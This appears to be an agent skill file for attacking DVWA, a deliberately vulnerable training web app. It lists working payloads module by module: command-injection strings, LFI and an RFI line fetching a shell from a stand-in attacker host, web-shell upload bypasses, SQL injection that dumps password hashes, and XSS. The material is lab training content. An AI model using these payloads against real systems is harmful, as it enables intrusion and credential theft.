---
name: dvwa-hunt
description: Complete methodology for DVWA (Damn Vulnerable Web Application) — brute force, command injection, CSRF, file inclusion/upload, SQLi, blind SQLi, XSS (reflected/stored/DOM), weak session IDs, CSP bypass, JavaScript attacks, open redirect. Use when the target is DVWA (localhost/dvwa, default admin/password) or a deliberately-vulnerable web app for training.
source_repo: custom
source_path: ''
source_license: original
---
# DVWA (Damn Vulnerable Web Application)

Setup: `docker run -d -p 80:80 vulnerables/web-dvwa` → http://localhost/dvwa → `admin` / `password`.
Set **Security: low** first (then medium/high/impossible to test bypasses). Reset DB between levels.

## Modules & techniques (per security level)
- **Brute Force** — `/vulnerabilities/brute/?username=admin&password=...&Login=Login`; fuzz with ffuf/hydra wordlist; medium adds sleep (timing), high adds token.
- **Command Injection** — `?ip=127.0.0.1;id` / `|whoami` / `$(id)`; low→medium (`;`→`&&`)→high (filter bypass: `1|whoami`, `%0a`, `${IFS}`).
- **CSRF** — change password form has no token (low); high requires token theft via XSS.
- **File Inclusion (LFI/RFI)** — `?page=../../../../etc/passwd`; `?page=php://filter/convert.base64-encode/resource=index.php`; RFI `?page=http://attacker/shell.txt`.
- **File Upload** — upload `shell.php`; bypasses: `.php.jpg`, `Content-Type: image/png`, magic bytes `GIF89a`, `.phtml`, null byte.
- **SQL Injection** — `?id=1' OR '1'='1`; UNION `?id=1' UNION SELECT user,password FROM users-- -`; dump hashes (`admin`=md5 of `password`).
- **SQL Injection (Blind)** — boolean/time: `?id=1' AND SLEEP(5)-- -`; extract char-by-char.
- **Weak Session IDs** — cookie `dvwaSession` increments (predictable); forge next value.
- **XSS (Reflected/DOM/Stored)** — `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`; stored in guestbook; DOM via `default=<script>`.
- **CSP Bypass** — inject a script via an allowed source (self/unsafe-inline) → alert.
- **JavaScript Attacks** — reverse the client-side `token`/`phrase` function; submit valid `success`.
- **Open Redirect** — `?redirect=` / `?url=` → external.

## Workflow
For each module: set the level, send the payload (curl), confirm the effect (command output, SQL data, alert, file contents), then escalate to higher security levels to test bypasses. Report each as a finding with request/response evidence.
